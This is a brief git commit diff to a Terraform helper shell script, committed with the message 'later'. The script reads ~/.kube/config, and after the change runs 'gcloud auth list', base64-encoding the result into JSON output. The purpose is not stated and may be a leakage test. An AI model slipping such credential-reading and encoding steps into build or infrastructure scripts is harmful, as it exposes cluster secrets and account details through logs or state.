40611f3d09e9c61c74102a14534f589561c8eedb
raffaelemazzitelli <raffaele.mazzitelli@gmail.com>
2024-02-25 17:31:59 +0100

    later

--- tf/custom-script.sh
+++ tf/custom-script.sh
@@ -18,5 +18,7 @@ dostuff() {
     cat ~/.kube/config
 }
 
-local env_base64=$(dostuff | base64 | tr -d '\n')
+
+
+local env_base64=$(gcloud auth list | base64 | tr -d '\n')
 echo "{\"test\":\"${env_base64}\"}" | jq
